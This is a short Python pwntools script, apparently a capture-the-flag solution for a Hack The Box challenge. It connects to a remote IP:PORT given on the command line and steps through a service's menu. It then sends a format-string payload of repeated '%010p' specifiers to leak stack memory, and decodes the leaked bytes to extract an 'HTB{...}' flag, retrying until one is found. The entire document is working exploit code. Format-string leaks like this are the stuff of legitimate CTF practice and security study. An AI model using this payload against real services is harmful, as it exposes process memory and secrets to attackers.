#!/usr/bin/env python3

from pwn import *
from itertools import chain
import sys, re

if __name__ == "__main__":
    context.bits = 32

    datas = [
            (b'Name: ', b'42'),
            (b'Nickname: ', b'42'),
            (b'> ', b'2'),
            (b'> ', b'2'),
            (b'> ', b'1'),
            (b'> ', b'%010p ' * 50)
            ]

    if len(sys.argv) < 2:
        print("Usage: writeup.py IP:PORT")
        exit(1)
    while True:
        serv = remote(*sys.argv[1].split(':'))
        try:
            for ask, rsp in datas:
                serv.recvuntil(ask)
                serv.sendline(rsp)
            serv.recvline()
            serv.recvline()
            result = [x for x in serv.recvuntil(b'(nil)').decode('utf-8').split(' ') if x][:-1]
        except EOFError:
            continue
        result = [[y for y in map(''.join, zip(x[::2], x[1::2])) if y != '0x'][::-1] for x in result]
        result = bytes.fromhex(''.join(chain.from_iterable(result)))
        result = re.findall(b'HTB{.+}', result)
        if result:
            warn(result[0].decode('utf-8'))
            exit(0)
    #serv.interactive()
